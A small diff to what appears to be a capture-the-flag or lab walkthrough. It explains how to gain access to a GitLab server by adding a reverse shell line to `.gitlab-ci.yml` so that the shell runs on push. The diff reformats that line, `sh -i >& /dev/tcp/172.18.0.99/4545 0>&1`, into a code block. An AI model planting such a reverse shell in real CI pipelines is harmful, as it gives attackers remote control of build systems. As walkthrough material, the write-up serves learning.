@@ -115,5 +115,7 @@ PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
 - Next step we must create a reverse shell to gitlab.
 - So we include the reverse shell in the `.gitlab-ci.yml`. This file will run our reverse shell after pushing the repo.
 - Just add a extra *-* line with the reverse shell under the existing one.
-`- sh -i >& /dev/tcp/172.18.0.99/4545 0>&1`
+```
+- sh -i >& /dev/tcp/172.18.0.99/4545 0>&1
+```
 - 
